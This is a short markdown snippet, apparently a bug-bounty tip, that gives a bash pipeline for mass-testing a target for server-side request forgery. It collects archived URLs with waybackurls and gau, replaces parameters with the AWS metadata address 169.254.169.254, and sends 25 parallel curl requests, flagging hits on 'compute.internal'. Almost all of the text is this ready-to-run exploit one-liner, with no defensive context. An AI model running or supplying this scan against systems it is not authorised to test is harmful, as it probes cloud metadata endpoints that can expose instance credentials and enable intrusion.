
## Accessing SSRF metadata with automation by just using curl and bash

**Command for getting URLs**
```bash
waybackurl target.com | tee wayback.txt
gau -subs target.com | tee gau-urls.txt

cat wayback.txt gau-urls.txt | sort -u |anew | httpx -silent | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
